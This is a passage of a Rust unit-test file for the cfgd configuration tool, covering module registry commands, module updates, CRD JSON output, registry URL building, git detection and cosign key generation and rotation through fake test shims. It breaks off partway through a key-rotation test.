    cmd_module_registry_add(&cli, &printer1, "https://example.com/reg.git", Some("team")).unwrap();

    // Add a profile that references team/somemod
    let profile_path = dir.path().join("profiles/default.yaml");
    std::fs::write(
            &profile_path,
            "apiVersion: cfgd.io/v1alpha1\nkind: Profile\nmetadata:\n  name: default\nspec:\n  modules:\n    - team/somemod\n",
        ).unwrap();

    let (printer2, buf2) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
    cmd_module_registry_remove(&cli, &printer2, "team", false).unwrap();
    drop(printer2);

    let output = buf2.lock().unwrap();
    assert!(
        output.contains("Removed module registry 'team'"),
        "should confirm removal, got: {output}"
    );
    assert!(
        output.contains("still references"),
        "should warn about profile references, got: {output}"
    );
}

// ─── cmd_module_registry_list — JSON empty registries ───────────

#[test]
fn cmd_module_registry_list_json_empty() {
    let dir = setup_config_dir();
    let cli = test_cli_json(dir.path());
    let (printer, cap) = cfgd_core::output::Printer::for_test_doc();

    cmd_module_registry_list(&cli, &printer).unwrap();
    drop(printer);

    let json = cap.json().expect("doc captured json");
    assert!(json.is_array());
    assert_eq!(json.as_array().unwrap().len(), 0);
}

// ─── cmd_module_registry_list — JSON no config ──────────────────

#[test]
fn cmd_module_registry_list_json_no_config() {
    let dir = tempfile::tempdir().unwrap();
    let cli = test_cli_json(dir.path());
    let (printer, cap) = cfgd_core::output::Printer::for_test_doc();

    cmd_module_registry_list(&cli, &printer).unwrap();
    drop(printer);

    let json = cap.json().expect("doc captured json");
    assert!(json.is_array());
    assert_eq!(json.as_array().unwrap().len(), 0);
}

// ─── apply_module_sets — multiple sets at once ──────────────────

#[test]
fn apply_set_multiple_at_once() {
    let mut doc = make_module_doc(vec![make_pkg("curl"), make_pkg("vim")]);
    apply_module_sets(
        &[
            "package.curl.minVersion=8.0".into(),
            "package.curl.prefer=brew".into(),
            "package.vim.script=install-vim.sh".into(),
            "package.vim.alias.apt=vim-gtk3".into(),
        ],
        &mut doc,
    )
    .unwrap();

    assert_eq!(doc.spec.packages[0].min_version.as_deref(), Some("8.0"));
    assert_eq!(doc.spec.packages[0].prefer, vec!["brew"]);
    assert_eq!(
        doc.spec.packages[1].script.as_deref(),
        Some("install-vim.sh")
    );
    assert_eq!(doc.spec.packages[1].aliases.get("apt").unwrap(), "vim-gtk3");
}

// ─── apply_module_sets — alias path too short ───────────────────

#[test]
fn apply_set_alias_path_too_short() {
    let mut doc = make_module_doc(vec![make_pkg("vim")]);
    let err = apply_module_sets(&["package.vim.alias=nope".into()], &mut doc).unwrap_err();
    assert!(
        err.to_string()
            .contains("expected package.<name>.alias.<manager>"),
        "should require manager for alias, got: {err}"
    );
}

// ─── apply_module_sets — empty package name ─────────────────────

#[test]
fn apply_set_empty_package_name() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    let err = apply_module_sets(&["package..minVersion=1.0".into()], &mut doc).unwrap_err();
    assert!(
        err.to_string().contains("expected package."),
        "should reject empty package name, got: {err}"
    );
}

// ─── apply_module_sets — empty field name ───────────────────────

#[test]
fn apply_set_empty_field_name() {
    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    let err = apply_module_sets(&["package.curl.=value".into()], &mut doc).unwrap_err();
    assert!(
        err.to_string().contains("expected package."),
        "should reject empty field name, got: {err}"
    );
}

// ─── mask_value — unicode characters ────────────────────────────

#[test]
fn mask_value_unicode() {
    // Unicode chars can be multi-byte but mask_value uses .chars()
    assert_eq!(mask_value(""), "***");
    assert_eq!(mask_value("ab"), "***");
    assert_eq!(mask_value("abcde"), "***cde");
}

// ─── profiles_using_module — multiple profiles match ────────────

#[test]
fn profiles_using_module_multiple_matches() {
    let dir = tempfile::tempdir().unwrap();
    let yaml1 = "apiVersion: cfgd.io/v1alpha1\nkind: Profile\nmetadata:\n  name: work\nspec:\n  inherits: []\n  modules:\n    - shared-mod\n";
    let yaml2 = "apiVersion: cfgd.io/v1alpha1\nkind: Profile\nmetadata:\n  name: home\nspec:\n  inherits: []\n  modules:\n    - shared-mod\n    - other-mod\n";
    let yaml3 = "apiVersion: cfgd.io/v1alpha1\nkind: Profile\nmetadata:\n  name: minimal\nspec:\n  inherits: []\n  modules:\n    - other-mod\n";
    std::fs::write(dir.path().join("work.yaml"), yaml1).unwrap();
    std::fs::write(dir.path().join("home.yaml"), yaml2).unwrap();
    std::fs::write(dir.path().join("minimal.yaml"), yaml3).unwrap();

    let result = profiles_using_module(dir.path(), "shared-mod").unwrap();
    assert_eq!(result.len(), 2, "should match 2 profiles");
    assert!(result.contains(&"work".to_string()));
    assert!(result.contains(&"home".to_string()));
}

// ─── profiles_using_module — ignores non-yaml files ─────────────

#[test]
fn profiles_using_module_ignores_non_yaml() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("notes.txt"),
        "not a yaml file with shared-mod",
    )
    .unwrap();

    let result = profiles_using_module(dir.path(), "shared-mod").unwrap();
    assert!(result.is_empty(), "should ignore non-yaml files");
}

// ─── profiles_using_module — handles invalid yaml gracefully ────

#[test]
fn profiles_using_module_invalid_yaml() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("bad.yaml"), "{{{{not valid yaml").unwrap();

    // Should not error — just skip invalid files
    let result = profiles_using_module(dir.path(), "shared-mod").unwrap();
    assert!(result.is_empty());
}

// ─── cmd_module_show — JSON with depends field ──────────────────

#[test]
fn cmd_module_show_json_depends() {
    let dir = setup_config_dir();
    make_module(
        dir.path(),
        "dep-show",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: dep-show\nspec:\n  depends:\n    - base\n    - core\n  packages: []\n",
    );

    let cli = test_cli_json(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_with_format(cfgd_core::output::OutputFormat::Json);

    cmd_module_show(&cli, &printer, "dep-show", false).unwrap();
    drop(printer);

    let output = buf.lock().unwrap();
    let json: serde_json::Value = serde_json::from_str(output.trim()).unwrap();
    let depends = json["depends"].as_array().unwrap();
    assert_eq!(depends.len(), 2);
    assert_eq!(depends[0], "base");
    assert_eq!(depends[1], "core");
}

// ─── cmd_module_update_local — manager-prefixed package removal ─

#[test]
fn cmd_module_update_remove_prefixed_package() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  packages:\n    - name: ripgrep\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    // Remove with manager prefix: -brew:ripgrep should strip prefix and remove "ripgrep"
    let args = super::ModuleUpdateArgs {
        packages: vec!["-brew:ripgrep".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();
    drop(printer);

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert!(
        doc.spec.packages.is_empty(),
        "ripgrep should be removed even with brew: prefix"
    );

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Removed package: ripgrep"),
        "should confirm removal, got: {output}"
    );
}

// ─── cmd_module_update_local — add file already tracked is noop ─

#[test]
fn cmd_module_update_add_already_tracked_file_noop() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  files:\n    - source: files/config.toml\n      target: ~/.config/app/config.toml\n",
    );

    // Create a source file with the same basename
    let source_file = dir.path().join("config.toml");
    std::fs::write(&source_file, "content").unwrap();

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        files: vec![format!(
            "{}:~/.somewhere/config.toml",
            source_file.display()
        )],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let output = buf.lock().unwrap();
    assert!(
        output.contains("already in module"),
        "should note file already tracked, got: {output}"
    );

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.spec.files.len(), 1, "should not add duplicate file");
}

// ─── cmd_module_create — with description shows in output ───────

#[test]
fn cmd_module_create_description_and_depends_output() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleCreateArgs {
        description: Some("My awesome module".to_string()),
        depends: vec!["base".to_string(), "core".to_string()],
        packages: vec!["curl".to_string()],
        ..make_module_create_args("desc-mod")
    };
    cmd_module_create(&cli, &printer, &args).unwrap();
    drop(printer);

    let (doc, _) = load_module_document(dir.path(), "desc-mod").unwrap();
    assert_eq!(
        doc.metadata.description,
        Some("My awesome module".to_string())
    );
    assert_eq!(doc.spec.depends, vec!["base", "core"]);

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Dependencies"),
        "should show dependencies in output, got: {output}"
    );
    assert!(
        output.contains("base, core"),
        "should list dependencies, got: {output}"
    );
}

// ─── cmd_module_create — no description omits the field ─────────

#[test]
fn cmd_module_create_no_description_omits_field() {
    let dir = setup_config_dir();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    // Supply a package so create stays non-interactive (no prompt) while
    // leaving description unset — the case that used to serialize `null`.
    let args = super::ModuleCreateArgs {
        packages: vec!["curl".to_string()],
        ..make_module_create_args("nodesc-mod")
    };
    cmd_module_create(&cli, &printer, &args).unwrap();

    let yaml = std::fs::read_to_string(
        dir.path()
            .join("modules")
            .join("nodesc-mod")
            .join("module.yaml"),
    )
    .unwrap();
    assert!(
        !yaml.contains("description:"),
        "a module created without --description must omit the field entirely, got: {yaml}"
    );

    let (doc, _) = load_module_document(dir.path(), "nodesc-mod").unwrap();
    assert_eq!(
        doc.metadata.description, None,
        "round-trip must keep description absent"
    );
}

// ─── cmd_module_registry_rename — no config fails ───────────────

#[test]
fn cmd_module_registry_rename_no_config_fails() {
    let dir = tempfile::tempdir().unwrap();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let err = cmd_module_registry_rename(&cli, &printer, "old", "new").unwrap_err();
    assert!(
        err.to_string().contains("cfgd.yaml"),
        "should fail without config, got: {err}"
    );
}

// ─── ModuleListEntry — serde serialization ──────────────────────

#[test]
fn module_list_entry_json_fields() {
    let entry = ModuleListEntry {
        name: "test-mod".to_string(),
        active: true,
        source: "local".to_string(),
        status: "applied".to_string(),
        packages: 3,
        files: 2,
        depends: 1,
    };
    let json = serde_json::to_value(&entry).unwrap();
    assert_eq!(json["name"], "test-mod");
    assert_eq!(json["active"], true);
    assert_eq!(json["source"], "local");
    assert_eq!(json["status"], "applied");
    assert_eq!(json["packages"], 3);
    assert_eq!(json["files"], 2);
    assert_eq!(json["depends"], 1);
}

// ─── ModuleShowOutput — serde serialization ─────────────────────

#[test]
fn module_show_output_json_fields() {
    let output = ModuleShowOutput {
        name: "test-mod".to_string(),
        directory: "/home/user/.config/cfgd/modules/test-mod".to_string(),
        source: "remote".to_string(),
        depends: vec!["base".to_string()],
        state: None,
        spec: config::ModuleSpec::default(),
    };
    let json = serde_json::to_value(&output).unwrap();
    assert_eq!(json["name"], "test-mod");
    assert_eq!(json["source"], "remote");
    assert_eq!(json["depends"][0], "base");
    assert!(json["state"].is_null());
    assert!(json["spec"].is_object());
}

// ─── cmd_module_update_local — invalid name fails ───────────────

#[test]
fn cmd_module_update_invalid_name_fails() {
    let dir = tempfile::tempdir().unwrap();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    let args = make_module_update_args(".bad-name");
    let err = cmd_module_update_local(&cli, &printer, &args).unwrap_err();
    assert!(
        err.to_string().contains("cannot start with"),
        "should reject invalid module name, got: {err}"
    );
}

// ─── cmd_module_update_local — combined operations ──────────────

#[test]
fn cmd_module_update_combined_operations() {
    let dir = tempfile::tempdir().unwrap();
    make_module(
        dir.path(),
        "mod1",
        "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: mod1\nspec:\n  depends:\n    - base\n  packages:\n    - name: curl\n  env:\n    - name: EDITOR\n      value: vim\n  aliases:\n    - name: gs\n      command: git status\n",
    );

    let cli = test_cli(dir.path());
    let (printer, buf) =
        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);

    let args = super::ModuleUpdateArgs {
        description: Some("Updated".to_string()),
        depends: vec!["core".to_string(), "-base".to_string()],
        packages: vec!["ripgrep".to_string(), "-curl".to_string()],
        env: vec!["PAGER=less".to_string(), "-EDITOR".to_string()],
        aliases: vec!["gp=git push".to_string(), "-gs".to_string()],
        post_apply: vec!["echo done".to_string()],
        ..make_module_update_args("mod1")
    };
    cmd_module_update_local(&cli, &printer, &args).unwrap();

    let (doc, _) = load_module_document(dir.path(), "mod1").unwrap();
    assert_eq!(doc.metadata.description, Some("Updated".to_string()));
    assert_eq!(doc.spec.depends, vec!["core"]);
    assert_eq!(doc.spec.packages.len(), 1);
    assert_eq!(doc.spec.packages[0].name, "ripgrep");
    assert_eq!(doc.spec.env.len(), 1);
    assert_eq!(doc.spec.env[0].name, "PAGER");
    assert_eq!(doc.spec.aliases.len(), 1);
    assert_eq!(doc.spec.aliases[0].name, "gp");
    assert!(doc.spec.scripts.is_some());

    let output = buf.lock().unwrap();
    assert!(
        output.contains("Updated module 'mod1'"),
        "should confirm update, got: {output}"
    );
}

// ─── cmd_module_keys_rotate — no cosign fails ───────────────────

#[test]
#[serial_test::serial]
fn cmd_module_keys_rotate_no_cosign_fails() {
    let _g = cfgd_core::test_helpers::EnvVarGuard::unset("CFGD_COSIGN_BIN");
    if cfgd_core::command_available("cosign") {
        return;
    }
    let printer = make_printer();
    let err = cmd_module_keys_rotate(&printer, None, &[]).unwrap_err();
    assert!(
        err.to_string().contains("cosign not found"),
        "should report cosign missing, got: {err}"
    );
}

// ─── cmd_module_keys_rotate — no existing key fails ─────────────

#[test]
fn cmd_module_keys_rotate_no_existing_key_fails() {
    if !cfgd_core::command_available("cosign") {
        return;
    }
    let dir = tempfile::tempdir().unwrap();
    let printer = make_printer();
    let err =
        cmd_module_keys_rotate(&printer, Some(dir.path().to_str().unwrap()), &[]).unwrap_err();
    assert!(
        err.to_string().contains("No existing cosign.key"),
        "should report no existing key, got: {err}"
    );
}

// ─── save_module_document — writes valid yaml ───────────────────

#[test]
fn save_module_document_writes_valid_yaml() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("module.yaml");

    let mut doc = make_module_doc(vec![make_pkg("curl")]);
    doc.metadata.description = Some("Test description".to_string());
    doc.spec.depends = vec!["base".to_string()];
    doc.spec.env = vec![cfgd_core::config::EnvVar {
        name: "FOO".to_string(),
        value: "bar".to_string(),
    }];

    save_module_document(&doc, &path).unwrap();

    let contents = std::fs::read_to_string(&path).unwrap();
    let parsed: config::ModuleDocument = serde_yaml::from_str(&contents).unwrap();
    assert_eq!(parsed.metadata.name, "test");
    assert_eq!(
        parsed.metadata.description,
        Some("Test description".to_string())
    );
    assert_eq!(parsed.spec.depends, vec!["base"]);
    assert_eq!(parsed.spec.packages[0].name, "curl");
    assert_eq!(parsed.spec.env[0].name, "FOO");
}

// ─── cmd_module_export — module with no packages ────────────────

#[test]
fn cmd_module_export_devcontainer_no_packages() {
    let dir = setup_config_dir();
    let yaml = "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: env-only\nspec:\n  env:\n    - name: MY_VAR\n      value: hello\n";
    make_module(dir.path(), "env-only", yaml);

    let output_dir = tempfile::tempdir().unwrap();
    let cli = test_cli(dir.path());
    let printer = make_printer();

    super::export_devcontainer(
        &cli,
        &printer,
        "env-only",
        Some(output_dir.path().to_str().unwrap()),
    )
    .unwrap();

    let install = std::fs::read_to_string(output_dir.path().join("env-only/install.sh")).unwrap();
    // Should not have apt-get install if no packages
    assert!(
        !install.contains("apt-get install"),
        "should not have apt install with no packages, got:\n{install}"
    );
    // Should still have env var setup
    assert!(
        install.contains("MY_VAR"),
        "should include env vars, got:\n{install}"
    );
}

// --- build_module_crd_json ---

fn module_doc_with(
    name: &str,
    packages: Vec<config::ModulePackageEntry>,
    files: Vec<config::ModuleFileEntry>,
    depends: Vec<String>,
) -> config::ModuleDocument {
    config::ModuleDocument {
        api_version: cfgd_core::API_VERSION.to_string(),
        kind: "Module".to_string(),
        metadata: config::ModuleMetadata {
            name: name.to_string(),
            description: None,
        },
        spec: config::ModuleSpec {
            packages,
            files,
            depends,
            ..Default::default()
        },
    }
}

#[test]
fn build_module_crd_json_emits_canonical_crd_envelope() {
    // The operator side accepts modules under group cfgd.io/v1alpha1, kind=Module.
    // Drifting any of these literal strings silently breaks `module push --apply`
    // for every existing operator-deployed cluster, so pin them here.
    let doc = module_doc_with("my-mod", vec![], vec![], vec![]);
    let v = super::push_pull::build_module_crd_json(&doc, "ghcr.io/me/my-mod:v1");

    assert_eq!(v["apiVersion"], cfgd_core::API_VERSION);
    assert_eq!(v["kind"], "Module");
    assert_eq!(v["metadata"]["name"], "my-mod");
    assert_eq!(v["spec"]["ociArtifact"], "ghcr.io/me/my-mod:v1");
}

#[test]
fn build_module_crd_json_uses_module_name_not_artifact_for_metadata() {
    // metadata.name MUST come from the module document, not the artifact
    // ref. The CRD names live in k8s; the artifact ref lives in OCI. Conflating
    // them would make every artifact-renamed module push create a NEW CRD.
    let doc = module_doc_with("module-canonical", vec![], vec![], vec![]);
    let v = super::push_pull::build_module_crd_json(&doc, "ghcr.io/whatever/totally-different:v9");

    assert_eq!(v["metadata"]["name"], "module-canonical");
    assert_ne!(v["metadata"]["name"], "totally-different");
}

#[test]
fn build_module_crd_json_packages_emit_only_name_field() {
    // The Module CRD's package entries only carry `name` (resolution lives on
    // the operator side via the module CRD's downstream reconcile). Other
    // ModulePackageEntry fields (minVersion, prefer, aliases, etc.) MUST NOT
    // leak into the CRD payload — that would either be silently ignored or
    // (worse) trip strict-schema rejection on a future CRD version.
    let mut pkg = make_pkg("ripgrep");
    pkg.min_version = Some("13.0".into());
    pkg.prefer = vec!["brew".into(), "cargo".into()];
    pkg.deny = vec!["apt".into()];
    pkg.platforms = vec!["darwin".into()];

    let doc = module_doc_with("m", vec![pkg], vec![], vec![]);
    let v = super::push_pull::build_module_crd_json(&doc, "art");

    let pkgs = v["spec"]["packages"].as_array().expect("packages array");
    assert_eq!(pkgs.len(), 1);
    let entry = pkgs[0].as_object().expect("package entry object");
    assert_eq!(entry.len(), 1, "package entry must contain only `name`");
    assert_eq!(entry.get("name").unwrap(), "ripgrep");
    assert!(!entry.contains_key("minVersion"));
    assert!(!entry.contains_key("prefer"));
    assert!(!entry.contains_key("deny"));
    assert!(!entry.contains_key("platforms"));
}

#[test]
fn build_module_crd_json_files_emit_only_source_and_target() {
    // Module CRD file entries are source+target pairs only. Per-file `strategy`,
    // `private`, `encryption` etc. are local-side concerns and must not leak.
    let f = config::ModuleFileEntry {
        source: "vimrc".into(),
        target: "~/.vimrc".into(),
        strategy: Some(config::FileStrategy::Symlink),
        private: true,
        encryption: None,
        permissions: None,
    };
    let doc = module_doc_with("m", vec![], vec![f], vec![]);
    let v = super::push_pull::build_module_crd_json(&doc, "art");

    let files = v["spec"]["files"].as_array().expect("files array");
    assert_eq!(files.len(), 1);
    let entry = files[0].as_object().expect("file entry object");
    assert_eq!(entry.len(), 2, "file entry must contain only source+target");
    assert_eq!(entry.get("source").unwrap(), "vimrc");
    assert_eq!(entry.get("target").unwrap(), "~/.vimrc");
    assert!(!entry.contains_key("strategy"));
    assert!(!entry.contains_key("private"));
}

#[test]
fn build_module_crd_json_depends_passes_through_verbatim() {
    let doc = module_doc_with(
        "m",
        vec![],
        vec![],
        vec!["base".into(), "shell".into(), "git".into()],
    );
    let v = super::push_pull::build_module_crd_json(&doc, "art");

    let depends = v["spec"]["depends"].as_array().expect("depends array");
    let names: Vec<&str> = depends.iter().filter_map(|d| d.as_str()).collect();
    assert_eq!(names, vec!["base", "shell", "git"]);
}

// --- detect_git_remote / detect_git_head via tempdir-rooted repos ---
//
// The helpers shell out to `git` via cfgd_core::git_cmd_local() and return
// None if the call fails (no repo, no git on PATH, non-zero exit). These
// tests cd into a freshly-initialized repo to drive both the Some and None
// arms.

#[test]
#[cfg(unix)]
#[serial_test::serial]
fn detect_git_remote_returns_url_when_origin_configured() {
    // Initialize a bare repo on disk, set an origin URL, cd into it, then
    // drive the helper. Asserts the helper returns the configured URL.
    if !cfgd_core::command_available("git") {
        return;
    }
    let tmp = tempfile::tempdir().unwrap();
    std::process::Command::new("git")
        .args(["init", "-q"])
        .current_dir(tmp.path())
        .status()
        .unwrap();
    std::process::Command::new("git")
        .args([
            "remote",
            "add",
            "origin",
            "https://example.test/owner/repo.git",
        ])
        .current_dir(tmp.path())
        .status()
        .unwrap();

    let prior_cwd = std::env::current_dir().unwrap();
    std::env::set_current_dir(tmp.path()).unwrap();
    let url = super::push_pull::detect_git_remote_for_tests();
    std::env::set_current_dir(prior_cwd).unwrap();

    assert_eq!(
        url.as_deref(),
        Some("https://example.test/owner/repo.git"),
        "should echo configured remote URL"
    );
}

#[test]
#[cfg(unix)]
#[serial_test::serial]
fn detect_git_head_returns_commit_sha_for_repo_with_commit() {
    // After `git init` and one commit, rev-parse HEAD should return a
    // 40-char hex SHA. Drives the helper's Some arm.
    if !cfgd_core::command_available("git") {
        return;
    }
    let tmp = tempfile::tempdir().unwrap();
    for args in [
        &["init", "-q"][..],
        &["config", "user.email", "test@example.test"][..],
        &["config", "user.name", "Test User"][..],
        &["commit", "--allow-empty", "-q", "-m", "init"][..],
    ] {
        std::process::Command::new("git")
            .args(args)
            .current_dir(tmp.path())
            .status()
            .unwrap();
    }
    let prior_cwd = std::env::current_dir().unwrap();
    std::env::set_current_dir(tmp.path()).unwrap();
    let head = super::push_pull::detect_git_head_for_tests();
    std::env::set_current_dir(prior_cwd).unwrap();

    let sha = head.expect("rev-parse should succeed in fresh repo");
    assert_eq!(sha.len(), 40, "expected 40-char SHA, got {sha:?}");
    assert!(
        sha.chars().all(|c| c.is_ascii_hexdigit()),
        "expected hex SHA, got {sha:?}"
    );
}

#[test]
#[cfg(unix)]
#[serial_test::serial]
fn detect_git_remote_returns_none_outside_a_git_repo() {
    let tmp = tempfile::tempdir().unwrap();
    let prior_cwd = std::env::current_dir().unwrap();
    std::env::set_current_dir(tmp.path()).unwrap();
    let url = super::push_pull::detect_git_remote_for_tests();
    std::env::set_current_dir(prior_cwd).unwrap();
    assert!(url.is_none(), "non-repo dir should return None");
}

#[test]
fn build_module_crd_json_empty_collections_emit_as_empty_arrays_not_null() {
    // server-side apply patches with `null` for an array field have a
    // different semantic from `[]` (the former is a no-op, the latter
    // means "set to empty"). The patch must always emit `[]` so that
    // an apply removes any stale entries from a previous module version.
    let doc = module_doc_with("m", vec![], vec![], vec![]);
    let v = super::push_pull::build_module_crd_json(&doc, "art");

    assert!(v["spec"]["packages"].is_array());
    assert!(v["spec"]["files"].is_array());
    assert!(v["spec"]["depends"].is_array());
    assert_eq!(v["spec"]["packages"].as_array().unwrap().len(), 0);
    assert_eq!(v["spec"]["files"].as_array().unwrap().len(), 0);
    assert_eq!(v["spec"]["depends"].as_array().unwrap().len(), 0);
}

// --- build_registry_module_url ---

#[test]
fn build_registry_module_url_assembles_subdir_and_per_module_tag() {
    // Assembles `<base>//modules/<module>@<module>/<tag>` so the module
    // resolves to a `modules/<module>` subdirectory pinned at the
    // per-module tag prefix `<module>/<tag>`.
    let url = super::build_registry_module_url(
        "https://github.com/cfgd-community/modules.git",
        "neovim",
        "v1.2.3",
    );
    assert_eq!(
        url,
        "https://github.com/cfgd-community/modules.git//modules/neovim@neovim/v1.2.3"
    );
}

#[test]
fn build_registry_module_url_repeats_module_in_tag_segment() {
    // The doubled module name (`@<module>/<tag>`) is the prescribed
    // per-module tag-prefix convention so a single registry repo can
    // carry independently versioned modules. Pin that contract.
    let url = super::build_registry_module_url("git@github.com:org/repo.git", "ripgrep", "v0.1.0");
    assert!(
        url.contains("@ripgrep/v0.1.0"),
        "tag segment must be <module>/<tag>, got: {url}"
    );
    assert!(url.contains("//modules/ripgrep"));
}

#[test]
fn build_registry_module_url_passes_unusual_tags_through_verbatim() {
    // `parse_git_source` later splits on the rightmost `@`; pre-pinned
    // SHA tags or odd tag formats must round-trip without escaping here.
    let url =
        super::build_registry_module_url("https://example.com/r.git", "mod", "abcdef0123456789");
    assert_eq!(
        url,
        "https://example.com/r.git//modules/mod@mod/abcdef0123456789"
    );
}

#[test]
fn build_registry_module_url_handles_ssh_base_urls() {
    // SSH-style git remotes use `git@host:org/repo.git` — the helper
    // shouldn't care which URL form the registry uses.
    let url = super::build_registry_module_url("git@github.com:owner/repo.git", "tool", "v3.0.0");
    assert!(url.starts_with("git@github.com:owner/repo.git//modules/tool"));
    assert!(url.ends_with("@tool/v3.0.0"));
}

// ─── cmd_module_keys_generate / rotate via fake-cosign ───────
//
// The cosign generate-key-pair flow shells out to `cosign` and depends
// on the binary writing `cosign.key` + `cosign.pub` to the cwd. These
// tests install a /bin/sh shim under CFGD_COSIGN_BIN that records argv
// and creates the expected files. require_tool_with_seam("CFGD_COSIGN_BIN",
// ...) honors the seam, and cfgd_core::cosign_cmd() uses tool_cmd which
// invokes the shim path.

#[cfg(unix)]
mod keys_with_fake_cosign {
    use super::*;
    use cfgd_core::test_helpers::CosignTestShim;
    use serial_test::serial;

    #[test]
    #[serial]
    fn cmd_module_keys_generate_creates_key_pair_when_cosign_succeeds() {
        let _shim = CosignTestShim::builder()
            .with_argv_logging(false)
            .with_keygen(true)
            .install();
        let work = tempfile::tempdir().expect("workdir");
        let dir_str = work.path().to_str().unwrap();

        let (printer, buf) =
            cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
        cmd_module_keys_generate(&printer, Some(dir_str)).expect("happy path → Ok");
        drop(printer);

        assert!(
            work.path().join("cosign.key").is_file(),
            "private key written by shim must land in target dir"
        );
        assert!(
            work.path().join("cosign.pub").is_file(),
            "public key written by shim must land in target dir"
        );

        let output = buf.lock().unwrap();
        assert!(
            output.contains("Private key") && output.contains("Public key"),
            "success output must mention both key paths: {output}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_keys_generate_returns_error_when_cosign_exits_nonzero() {
        let _shim = CosignTestShim::builder()
            .with_argv_logging(false)
            .with_keygen(true)
            .with_exit(2)
            .install();
        let work = tempfile::tempdir().expect("workdir");
        let dir_str = work.path().to_str().unwrap();

        let printer = make_printer();
        let err =
            cmd_module_keys_generate(&printer, Some(dir_str)).expect_err("non-zero exit → Err");
        assert!(
            err.to_string().contains("cosign generate-key-pair failed"),
            "error must surface the failure context: {err}"
        );
    }

    #[test]
    fn cmd_module_keys_rotate_fails_when_no_existing_private_key() {
        // No shim needed — the missing-key check fires before cosign is
        // ever invoked. CFGD_COSIGN_BIN is not set; require_tool_with_seam
        // falls through to require_tool, which finds the real cosign on
        // PATH (or surfaces "cosign not found" if missing). Either way,
        // the precondition error wins.
        let work = tempfile::tempdir().expect("workdir");
        let dir_str = work.path().to_str().unwrap();

        let printer = make_printer();
        let err = cmd_module_keys_rotate(&printer, Some(dir_str), &[])
            .expect_err("missing cosign.key → Err");
        let msg = err.to_string();
        // require_tool_with_seam might fail first if cosign is missing
        // on PATH (no env var, no real binary). Accept either error path
        // here; the rotate-without-key precondition is the one we care
        // most about, but both are valid early-failures.
        assert!(
            msg.contains("No existing cosign.key") || msg.contains("cosign not found"),
            "expected missing-key or cosign-not-installed error: {msg}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_keys_rotate_restore_failure_surfaces_restorefailed_payload() {
        use std::os::unix::fs::PermissionsExt;

        let work = tempfile::tempdir().expect("workdir");
        let key_dir = work.path();
        std::fs::write(key_dir.join("cosign.key"), b"old-priv").expect("write old key");
        std::fs::write(key_dir.join("cosign.pub"), b"old-pub").expect("write old pub");

        // Custom shim (not CosignTestShim, which doesn't expose script
        // composition): exits non-zero AND replaces the to-be-restored
        // paths with non-empty directories. `std::fs::rename(backup, dest)`
        // then fails (ENOTEMPTY on Linux), driving the restore-failures
        // accumulation branch + the JSON "restoreFailed": true payload.
        let shim_tmp = tempfile::TempDir::new().expect("shim tempdir");
        let shim_path = shim_tmp.path().join("fake-cosign");
        let script = format!(
            "#!/bin/sh\n\
             mkdir -p '{0}/cosign.key/blocker'\n\
             mkdir -p '{0}/cosign.pub/blocker'\n\
             exit 2\n",
            key_dir.display()
        );
        std::fs::write(&shim_path, &script).expect("write shim");
        let mut perms = std::fs::metadata(&shim_path)
            .expect("stat shim")
            .permissions();
        perms.set_mode(0o755);
        std::fs::set_permissions(&shim_path, perms).expect("chmod shim");

        let _g = cfgd_core::test_helpers::EnvVarGuard::set(
            "CFGD_COSIGN_BIN",
            shim_path.to_str().expect("shim path utf8"),
        );

        let printer = make_printer();
        let err = cmd_module_keys_rotate(&printer, Some(key_dir.to_str().expect("dir utf8")), &[])
            .expect_err("rotate must fail when cosign exits non-zero and restore fails");

        let msg = err.to_string();
        assert!(
            msg.contains("key restore FAILED"),
            "expected restore-failed message in error: {msg}"
        );
        assert!(
            msg.contains("manually restore"),
            "user must be told to restore manually: {msg}"
        );
    }

    #[test]
    #[serial]
    fn cmd_module_keys_rotate_backs_up_old_keys_and_generates_new() {
        let _shim = CosignTestShim::builder()
            .with_argv_logging(false)
            .with_keygen(true)
            .install();
        let work = tempfile::tempdir().expect("workdir");
        let dir = work.path();
        // Pre-create the existing key pair so the rotate flow proceeds
        // past the precondition check.
        std::fs::write(dir.join("cosign.key"), b"old-private-key-bytes").unwrap();
        std::fs::write(dir.join("cosign.pub"), b"old-public-key-bytes").unwrap();

        let printer = make_printer();
